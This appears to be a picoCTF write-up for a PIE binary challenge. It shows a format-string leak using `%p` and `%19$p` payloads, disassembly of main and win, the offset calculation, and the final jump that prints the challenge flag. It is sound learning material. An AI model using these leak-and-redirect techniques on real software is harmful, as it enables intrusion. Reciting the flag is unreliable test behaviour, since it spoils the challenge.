Same thing as before, the executable is PIE (Position Independent Executable). 
```
>> file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89c0ed5ed3766d1b85809c2bef48b6f5f0ef9364, for GNU/Linux 3.2.0, not stripped
```
So we'll need to leak the runtime memory addresses, only this time, we'll need to exploit some kind of vulnerablity. Looking through the code, it gives us an easy way to jump to memory addresses, and a potential format string vulnerability.
```c
printf("Enter your name:");
fgets(buffer, 64, stdin);
printf(buffer);
```

Printing out a bunch of memory addresses using format string's `%p`, we get:
```
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
0x5555555592a1 0xfbad2288 0xaaaa6d5f 0x5555555592dd (nil) 0x7fffffffdde0 0x7ffff7e2da86 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa20702520 (nil) 0x219fb04284060a00 0x7fffffffde30 0x555555555441 0x7fffffffded0 
```

All of the values that start with 0x555555555 seem promising, since that usually is the memory region of the text segment, where code in a binary file is stored. Dissassembling the main function to look at potential return pointers, we find:

```asm
0x0000555555555400 <+0>:	endbr64
0x0000555555555404 <+4>:	push   %rbp
0x0000555555555405 <+5>:	mov    %rsp,%rbp
0x0000555555555408 <+8>:	lea    -0x166(%rip),%rsi        # 0x5555555552a9 <segfault_handler>
0x000055555555540f <+15>:	mov    $0xb,%edi
0x0000555555555414 <+20>:	call   0x555555555170 <signal@plt>
0x0000555555555419 <+25>:	mov    0x2bf0(%rip),%rax        # 0x555555558010 <stdout@@GLIBC_2.2.5>
0x0000555555555420 <+32>:	mov    $0x0,%ecx
0x0000555555555425 <+37>:	mov    $0x2,%edx
0x000055555555542a <+42>:	mov    $0x0,%esi
0x000055555555542f <+47>:	mov    %rax,%rdi
0x0000555555555432 <+50>:	call   0x555555555180 <setvbuf@plt>
0x0000555555555437 <+55>:	mov    $0x0,%eax
0x000055555555543c <+60>:	call   0x5555555552c7 <call_functions>
0x0000555555555441 <+65>:	mov    $0x0,%eax
0x0000555555555446 <+70>:	pop    %rbp
0x0000555555555447 <+71>:	ret
```

The 19th value `%19$p` (0x0000555555555441), seems to be the return address after call_functions. This makes since, because as functions are called, the memory address it should return to after it finishes the call is pushed onto the stack. Now that we have a memory address, we can use it to calculate the offset of our win function.

```
Dump of assembler code for function win:
   0x000055555555536a <+0>:	endbr64
```

Subtracting the two values, we get that it is an offset of 215 bytes. With this knowledge, we can crack the exploit. 

```
Enter your name:%19$p
0x5e699fd40441
 enter the address to jump to, ex => 0x12345: 0x5e699fd4036a
You won!
picoCTF{p13_5h0u1dn'7_134k}
```